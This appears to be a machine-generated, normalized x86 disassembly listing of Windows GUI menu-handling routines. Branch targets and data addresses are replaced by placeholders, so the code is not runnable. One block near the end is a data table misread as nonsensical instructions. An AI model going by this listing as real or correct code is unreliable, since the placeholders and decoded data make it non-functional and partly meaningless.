mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4480c8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448568
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_448568
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_448568
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4480d4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_447fc4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_448058
mov eax ebx
call sub_44858c
jmp r-xdata
sub_44813c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_448184
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4423b4
mov eax ebx
call sub_447998
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_4423f8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419dac
sub_4481c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419ff8
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_448184
sub_448204
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447a48
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_447a48
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44b6ac
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_448260
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_448335
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447a48
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447a48
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4465f4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446604
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40409c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40409c
mov eax [ ebp - 0xc ]
pop edx
call sub_407b10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_4490ac
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44833c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403ed8
retn
sub_448348
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_448204
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_448260
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4484c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_447bcc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_447a48
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_447a48
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40848c
mov eax [ ebp + 0x10 ]
call sub_4083d0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44858c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_431970
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448568
mov [ ebx + 0x41 ] 0x1
sub_4485b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448568
mov [ ebx + 0x41 ] 0x1
sub_448640
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44813c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_447fc4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4486d0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44870c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448736
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448758
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448c8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c92
lea eax [ ebp - 0x30 ]
call sub_403eb4
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ esi + 0x4 ]
call sub_447b04
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_454cbc
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov dx [ esi + 0x4 ]
call sub_447ae8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_448abe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_448aa1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41dc3c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dadc
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_448f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448aa8
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dc3c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_448348
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_447a48
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_447a48
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_448c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_448bdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_448bbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41dc3c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dadc
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448bc6
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dc3c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_431bf4
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454cbc
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_447a48
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_447a48
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_447a48
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_447a78
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_447a78
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_454960
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_4549c8
jmp r-xdata
sub_448be3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_448c9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413898
pop esi
pop ebx
retn
push ebx
push sub_44870c
call sub_41ae28
mov [ ebx + 0x10 ] eax
sub_448ce0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_447860
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_448c9c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_448d54
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_448cc4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4478fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_448dac
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_443bf8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_448568
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448568
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_448df4
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_443bf8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45350c
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4032f4
mov edx eax
jmp r-xdata
sub_448e40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412598
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_448dac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4471b4
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4476b0
mov eax [ ebx + 0x34 ]
call sub_444a58
mov eax ebx
call sub_448058
mov eax ebx
call sub_448df4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_444b88
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_448ef4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139f4
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139f4
cmp ebp [ eax ]
jne r-xdata
sub_448f30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d4f4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41cd28
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d4f4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41cd28
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4032f4
mov edx [ r-xdata ]
call sub_403284
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d4f4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41cd28
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_449018
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f08
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404174
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404414
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404174
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404414
jmp r-xdata
sub_4490ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403eb4
mov ebx 0x1
mov eax esi
call sub_404174
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40409c
sub_449110
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449169
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449018
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449018
mov eax [ ebp - 0x8 ]
pop edx
call sub_407b48
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449170
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
sub_449178
adc al [ eax ]
add [ eax ] al
sub al 0x8c
inc esi
add [ esi + edx * 4 + 0x46 ] bh
add [ eax ] ch
mov [ esi ] es
add al 0x96
inc esi
add [ esp + ecx * 4 ] ah
inc esi
add [ eax + 0x20004695 ] al
mov [ esi ] es
aam 0x95
inc esi
add [ esp + ecx * 4 ] bl
inc esi
add [ eax + 0x1800469a ] al
mov [ esi ] es
fcom [ ebp - 0x73ebffba ]
inc esi
add [ eax - 0x68 ] al
inc esi
add [ eax ] dl
mov [ esi ] es
push 0xc004697
mov [ esi ] es
inc eax
fwait
inc esi
add [ eax ] cl
mov [ esi ] es
cmp al 0x9b
inc esi
add [ esp + ecx * 4 ] al
inc esi
add al ch
xchg esi eax
inc esi
add [ eax ] al
mov [ esi ] es
fcomp [ edx - 0x7403ffba ]
inc esi
add [ eax - 0x7ffb966 ] cl
mov eax [ esi ]
mov al 0x9b
inc esi
add ah dh
mov eax [ esi ]
insb
fwait
inc esi
add al dh
mov eax [ esi ]
add [ edi - 0x7413ffba ] dl
inc esi
add [ eax ] bl
xchg edi eax
inc esi
add al ch
mov eax [ esi ]
xchg esp eax
xchg edi eax
inc esi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_449270
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449277
retn
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
call sub_403eb4
sub_44927c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_449178
call sub_403bdc
